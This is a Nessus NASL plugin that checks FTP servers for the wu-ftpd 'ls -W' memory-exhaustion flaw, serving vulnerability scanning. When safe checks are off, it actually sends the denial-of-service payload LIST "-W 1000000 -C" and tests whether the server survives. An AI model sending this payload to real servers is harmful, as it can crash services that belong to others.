# This script was (badly) written by Michel Arboi <arboi@alussinan.org>
# HD Moore suggested fixes and the safe_checks code.
# It is released under the General Public License (GPLv2).
# 
# Credit: Georgi Guninski discovered this attack
#

if (description)
{
 script_id(11912);
 script_bugtraq_id(8875);
 script_cve_id("CVE-2003-0853", "CVE-2003-0854");
 if (defined_func("script_xref"))
 {
   script_xref(name: "CONECTIVA", value: "CLA-2003:768");
   script_xref(name: "zone-h", value: "3299");
 }

 script_version("$Revision: 1.6 $");
 name["english"] = "wu-ftpd ls -W memory exhaustion";
 script_name(english: name["english"]);

 desc["english"] = '
The FTP server does not filter arguments to the ls command. 
It is possible to consume all available memory on the machine 
by sending 
	ls "-w 1000000 -C"
See http://www.guninski.com/binls.html

Solution : Contact your vendor for a fix
Risk factor : High';

 script_description(english: desc["english"]);
 script_summary(english: "send ls -w 1000000 -C to the remote FTP server");

 script_category(ACT_MIXED_ATTACK);
 script_family(english: "FTP");

 script_copyright(english: "Copyright (C) 2003 Michel Arboi");
 script_dependencie("find_service.nes", "ftp_anonymous.nasl");
 script_require_ports("Services/ftp", 21);
 exit(0);
}


#

include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if (!port) port = 21;
if (!get_port_state(port)) exit(0);

user = get_kb_item("ftp/login");
pass = get_kb_item("ftp/password");

if (! user) user = "anonymous";
if (! pass) pass = "nessus@example.com";

soc = open_sock_tcp(port);
if (!soc) exit(0);

if (! ftp_authenticate(socket:soc, user: user, pass: pass)) exit(0);

port2 = ftp_pasv(socket:soc);
if (!port2)
{
  ftp_close(socket: soc);
  exit(0);
}

soc2 = open_sock_tcp(port2, transport: ENCAPS_IP);

if (!soc2 || safe_checks())
{
  send(socket: soc, data: 'LIST -ABCDEFGHIJKLMNOPQRSTUV\r\n');
  r1 = ftp_recv_line(socket:soc);
  if (egrep(string: r1, pattern: "invalid option|usage:", icase: 1))
    security_hole(port);
 if(soc2)close(soc2);
 ftp_close(socket: soc);
 exit(0);
}
  
start_denial();

send(socket:soc, data: 'LIST "-W 1000000 -C"\r\n');
r1 = ftp_recv_line(socket:soc);
l = ftp_recv_listing(socket: soc2);
r2 = ftp_recv_line(socket:soc);
close(soc2);
ftp_close(socket: soc);

alive = end_denial();
if (! alive)
{
  security_hole(port);
  exit(0);
}

if (egrep(string: r2, pattern: "exhausted|failed", icase: 1))
{
  security_hole(port);
  exit(0);
}

soc = open_sock_tcp(port);
if (! soc || ! ftp_authenticate(socket:soc, user: user, pass: pass))
  security_hole(port);
if (soc) ftp_close(socket: soc);

